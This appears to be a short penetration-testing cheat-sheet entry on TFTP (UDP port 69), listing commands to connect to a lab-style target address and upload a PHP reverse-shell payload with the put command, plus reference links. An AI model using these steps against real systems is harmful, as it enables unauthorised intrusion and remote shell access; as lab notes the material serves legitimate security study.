# TFTP: UDP Port 69

1. Install [TFTP client](https://www.poftut.com/install-configure-run-linux-tftp-client/)
2. Connect to TFTP server

        tftp 10.10.10.4

3. Upload attack payload using **put** command

        tftp> put php-reverse-shell.php

## References

* https://www.dell.com/support/article/en-in/how10331/how-to-install-tftp-client?lang=en
* https://www.poftut.com/install-configure-run-linux-tftp-client/